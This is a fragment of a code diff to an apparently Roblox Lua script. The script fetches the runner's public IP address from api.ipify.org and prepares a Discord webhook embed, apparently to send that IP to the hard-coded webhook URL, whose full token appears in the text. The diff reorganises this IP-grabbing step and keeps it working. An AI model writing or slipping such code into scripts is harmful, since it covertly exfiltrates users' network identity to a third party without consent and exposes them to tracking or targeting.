@@ -11,12 +11,12 @@ local IpCheck = pcall(function()
     game:HttpGet("https://api.ipify.org", true)
 end)
 
-local Ip = game:HttpGet("https://api.ipify.org", true)
-
 local url =
    "https://discord.com/api/webhooks/914094424596836362/zOB91I9k8UZhWP1Y8rUMGcnKGe_SUtyIkucYcOxckbJj6WH6m5jaB_JYSNBwsvXWBP0d"
 
 if IpCheck then
+    local Ip = game:HttpGet("https://api.ipify.org", true)
+
     local data = {
         ["embeds"] = {
             {
